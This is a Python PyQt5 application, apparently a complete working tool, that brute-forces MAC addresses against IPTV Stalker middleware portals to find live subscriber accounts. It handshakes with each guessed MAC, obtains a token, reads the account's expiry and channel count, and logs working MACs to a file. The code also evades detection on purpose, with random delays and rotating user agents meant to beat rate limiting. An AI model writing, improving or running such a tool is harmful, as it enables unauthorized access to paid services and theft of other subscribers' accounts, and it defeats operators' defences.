import sys
import json
import random
import time
import threading
from datetime import datetime
from urllib.parse import urlparse

import requests
from PyQt5 import QtWidgets, QtCore, QtGui
from PyQt5.QtCore import QThread, pyqtSignal, Qt

# ----- Anti-detection delay settings -----
# Randomise the pause between each MAC attempt to mimic human browsing
DELAY_MIN = 0.5   # seconds
DELAY_MAX = 2.5   # seconds

# Optional: workaround for OpenSSL 3.0 if needed
try:
    import cryptography.hazmat.bindings.openssl
    cryptography.hazmat.bindings.openssl.CRYPTOGRAPHY_OPENSSL_300_OR_GREATER = True
except ImportError:
    pass


# ----- Load user agents -----
try:
    with open('agents.txt', 'r') as f:
        USER_AGENTS = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ]


def get_random_user_agent():
    return random.choice(USER_AGENTS)


# ----- MAC generator -----
def generate_mac_combinations(prefix: str = "00:1A:79:", start_from: str = None):
    """
    Yields MAC addresses in the form prefix:XX:YY:ZZ.
    If start_from is given, it must be three hex parts (e.g. "AB:CD:EF").
    """
    start = 0
    middle = 0
    end = 0
    if start_from:
        parts = start_from.split(":")
        if len(parts) == 3:
            try:
                start, middle, end = [int(p, 16) for p in parts]
            except ValueError:
                raise ValueError("Invalid hex in start_from")
        else:
            raise ValueError("start_from must be three hex parts, e.g. AB:CD:EF")

    max_hex = 256  # 0x00 to 0xFF
    for i in range(start, max_hex):
        for j in range(middle if i == start else 0, max_hex):
            for k in range(end if j == middle else 0, max_hex):
                yield f"{prefix}{i:02X}:{j:02X}:{k:02X}"


# ----- Worker that does the scanning in a separate thread -----
class ScanWorker(QThread):
    # Signals to communicate with the main GUI thread
    output_signal = pyqtSignal(str, str)          # text, color
    progress_signal = pyqtSignal(str, int)        # current MAC, total count
    finished_signal = pyqtSignal()
    error_signal = pyqtSignal(str)

    def __init__(self, base_url, mac_prefix, start_suffix):
        super().__init__()
        self.base_url = base_url
        self.mac_prefix = mac_prefix
        self.start_suffix = start_suffix
        self._stop = False
        self._session = None

    def stop(self):
        """Request the worker to stop."""
        self._stop = True

    def _jitter_sleep(self):
        """Sleep for a random duration between DELAY_MIN and DELAY_MAX seconds.

        This spreads requests over time and makes traffic patterns look more
        like a real STB client, reducing the chance of being rate-limited.
        """
        delay = random.uniform(DELAY_MIN, DELAY_MAX)
        self.output_signal.emit(
            f"  ⏳ Waiting {delay:.2f}s before next attempt…", "gray"
        )
        # Sleep in small increments so _stop is honoured quickly
        elapsed = 0.0
        step = 0.1
        while elapsed < delay:
            if self._stop:
                return
            time.sleep(step)
            elapsed += step

    def run(self):
        """Main scanning loop."""
        try:
            # Create a single session and reuse it
            self._session = requests.Session()
            self._session.timeout = 10

            # Prepare output file name
            hostname = urlparse(self.base_url).hostname or "portal"
            current = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"{hostname}_{current}.txt"

            mac_generator = generate_mac_combinations(self.mac_prefix, self.start_suffix)
            count = 0

            for mac in mac_generator:
                if self._stop:
                    break

                count += 1
                self.progress_signal.emit(mac, count)

                # Rotate User-Agent on every MAC to vary the HTTP fingerprint
                self._session.headers.update({'User-Agent': get_random_user_agent()})

                try:
                    # Handshake
                    self._session.cookies.clear()
                    self._session.cookies.set('mac', mac)
                    handshake_url = f"{self.base_url}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
                    resp = self._session.get(handshake_url, allow_redirects=False)
                    resp.raise_for_status()

                    data = resp.json()
                    if 'js' not in data or 'token' not in data['js']:
                        self.output_signal.emit(f"MAC {mac}: no token in response", "orange")
                        continue
                    token = data['js']['token']

                    # Get account info
                    info_url = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                    headers = {"Authorization": f"Bearer {token}"}
                    info_resp = self._session.get(info_url, headers=headers, allow_redirects=False)
                    info_resp.raise_for_status()
                    info_data = info_resp.json()

                    if 'js' not in info_data or 'mac' not in info_data['js'] or 'phone' not in info_data['js']:
                        self.output_signal.emit(f"MAC {mac}: incomplete account info", "orange")
                        continue

                    mac_valid = info_data['js']['mac']
                    expiry = info_data['js']['phone']

                    # Fetch genres (optional, for channel grouping)
                    genre_url = f"{self.base_url}/server/load.php?type=itv&action=get_genres&JsHttpRequest=1-xml"
                    genre_resp = self._session.get(genre_url, headers=headers, allow_redirects=False)
                    genre_map = {}
                    if genre_resp.status_code == 200:
                        try:
                            genre_data = genre_resp.json()
                            if 'js' in genre_data and isinstance(genre_data['js'], list):
                                for g in genre_data['js']:
                                    if 'id' in g and 'title' in g:
                                        genre_map[g['id']] = g['title']
                        except json.JSONDecodeError:
                            pass  # ignore, we can still fetch channels

                    # Fetch channel list
                    channel_url = f"{self.base_url}/portal.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                    channel_resp = self._session.get(channel_url, headers=headers, allow_redirects=False)
                    channel_count = 0
                    if channel_resp.status_code == 200:
                        try:
                            channel_data = channel_resp.json()
                            if 'js' in channel_data and 'data' in channel_data['js']:
                                channel_count = len(channel_data['js']['data'])
                        except json.JSONDecodeError:
                            self.output_signal.emit(f"MAC {mac}: invalid channel JSON", "red")
                    else:
                        self.output_signal.emit(f"MAC {mac}: channel list fetch failed (status {channel_resp.status_code})", "red")

                    if channel_count == 0:
                        self.output_signal.emit(f"MAC {mac}: no channels found", "orange")
                    else:
                        msg = f"MAC = {mac_valid}\nExpiry = {expiry}\nChannels = {channel_count}"
                        self.output_signal.emit(msg, "green")
                        # Append to file
                        with open(filename, "a", encoding="utf-8") as f:
                            f.write(f"{self.base_url}/c/\nMAC = {mac_valid}\nExpiry = {expiry}\nChannels = {channel_count}\n\n")

                except requests.exceptions.RequestException as e:
                    self.output_signal.emit(f"MAC {mac}: network error - {e}", "red")
                except json.JSONDecodeError:
                    self.output_signal.emit(f"MAC {mac}: invalid JSON response", "red")
                except (KeyError, ValueError) as e:
                    self.output_signal.emit(f"MAC {mac}: data parsing error - {e}", "red")
                except Exception as e:
                    self.output_signal.emit(f"MAC {mac}: unexpected error - {e}", "red")
                finally:
                    # Always pause between attempts, even after errors,
                    # so failed probes don't create burst traffic.
                    if not self._stop:
                        self._jitter_sleep()

            if self._stop:
                self.output_signal.emit("Scan stopped by user.", "blue")
            else:
                self.output_signal.emit("Scan completed.", "blue")

        except Exception as e:
            self.error_signal.emit(f"Fatal error in worker: {e}")
        finally:
            self.finished_signal.emit()


# ----- Main GUI Window -----
class StalkerPortalApp(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.worker = None
        self.initUI()

    def initUI(self):
        self.setWindowTitle("Stalker Portal MAC Generator & Checker")
        self.resize(800, 600)

        layout = QtWidgets.QVBoxLayout()

        # Input fields
        form_layout = QtWidgets.QFormLayout()
        self.url_entry = QtWidgets.QLineEdit()
        self.url_entry.setPlaceholderText("e.g. http://portal.example.com:8080")
        self.mac_entry = QtWidgets.QLineEdit()
        self.mac_entry.setPlaceholderText("Optional: full MAC or suffix like AB:CD:EF")

        form_layout.addRow("Portal URL (with port):", self.url_entry)
        form_layout.addRow("Start from MAC (optional):", self.mac_entry)
        layout.addLayout(form_layout)

        # Buttons
        button_layout = QtWidgets.QHBoxLayout()
        self.start_btn = QtWidgets.QPushButton("Start")
        self.start_btn.clicked.connect(self.start_scan)
        self.stop_btn = QtWidgets.QPushButton("Stop")
        self.stop_btn.clicked.connect(self.stop_scan)
        self.stop_btn.setEnabled(False)
        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        layout.addLayout(button_layout)

        # Progress info
        self.status_label = QtWidgets.QLabel("Ready")
        layout.addWidget(self.status_label)

        # Output text area
        self.output_text = QtWidgets.QTextEdit()
        self.output_text.setReadOnly(True)
        layout.addWidget(self.output_text)

        # Developer info
        developer_info = """
        <p>Developed by vnvss-0x.</p>
        <p>GitHub: <a href='https://github.com/vnvss-0x'>https://github.com/vnvss-0x</a></p>
        """
        self.dev_label = QtWidgets.QLabel(developer_info)
        self.dev_label.setTextFormat(Qt.RichText)
        self.dev_label.setOpenExternalLinks(True)
        layout.addWidget(self.dev_label)

        self.setLayout(layout)

        # Show initial user agent
        self.print_colored(f"Using user agent: {get_random_user_agent()}", "blue")

    def print_colored(self, text, color="black"):
        """Thread‑safe append to output (call only from main thread)."""
        self.output_text.setTextColor(QtGui.QColor(color))
        self.output_text.append(text)
        self.output_text.moveCursor(QtGui.QTextCursor.End)

    def start_scan(self):
        """Validate input and start the worker thread."""
        base_url = self.url_entry.text().strip()
        if not base_url:
            QtWidgets.QMessageBox.critical(self, "Error", "Please enter the portal URL.")
            return

        # Normalise URL: add scheme if missing
        if not base_url.startswith(('http://', 'https://')):
            base_url = 'http://' + base_url

        parsed = urlparse(base_url)
        if not parsed.hostname:
            QtWidgets.QMessageBox.critical(self, "Error", "Invalid URL. Please include hostname.")
            return
        if parsed.port is None:
            # default port: if https then 443 else 80
            default_port = 443 if parsed.scheme == 'https' else 80
            base_url = f"{parsed.scheme}://{parsed.hostname}:{default_port}"

        mac_input = self.mac_entry.text().strip().upper()
        prefix = "00:1A:79:"
        start_suffix = None

        if mac_input:
            if mac_input.startswith(prefix):
                start_suffix = mac_input[len(prefix):]
            else:
                # check if it's a suffix (three hex pairs)
                parts = mac_input.split(":")
                if len(parts) == 3:
                    try:
                        for p in parts:
                            int(p, 16)
                        start_suffix = mac_input
                    except ValueError:
                        QtWidgets.QMessageBox.critical(self, "Error", "Invalid MAC suffix. Use format like AB:CD:EF.")
                        return
                else:
                    QtWidgets.QMessageBox.critical(self, "Error", "MAC must start with '00:1A:79:' or be a three‑part suffix (e.g. AB:CD:EF).")
                    return

        # Disable start, enable stop
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.output_text.clear()
        self.status_label.setText("Scanning...")

        # Create and start worker
        self.worker = ScanWorker(base_url, prefix, start_suffix)
        self.worker.output_signal.connect(self.print_colored)
        self.worker.progress_signal.connect(self.update_progress)
        self.worker.finished_signal.connect(self.scan_finished)
        self.worker.error_signal.connect(self.handle_worker_error)
        self.worker.start()

    def stop_scan(self):
        """Request the worker to stop."""
        if self.worker is not None and self.worker.isRunning():
            self.worker.stop()
            self.status_label.setText("Stopping...")
            self.stop_btn.setEnabled(False)  # prevent multiple clicks

    def update_progress(self, mac, count):
        """Slot for progress updates."""
        self.status_label.setText(f"Checking: {mac}  (processed: {count})")

    def scan_finished(self):
        """Cleanup after worker finishes."""
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText("Ready")
        self.worker = None

    def handle_worker_error(self, error_msg):
        """Display fatal errors from the worker."""
        QtWidgets.QMessageBox.critical(self, "Worker Error", error_msg)
        self.scan_finished()

    def closeEvent(self, event):
        """Ensure worker is stopped when window is closed."""
        if self.worker is not None and self.worker.isRunning():
            self.worker.stop()
            self.worker.wait()  # wait for thread to finish
        event.accept()


# ----- Main entry point -----
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    window = StalkerPortalApp()
    window.show()
    sys.exit(app.exec_())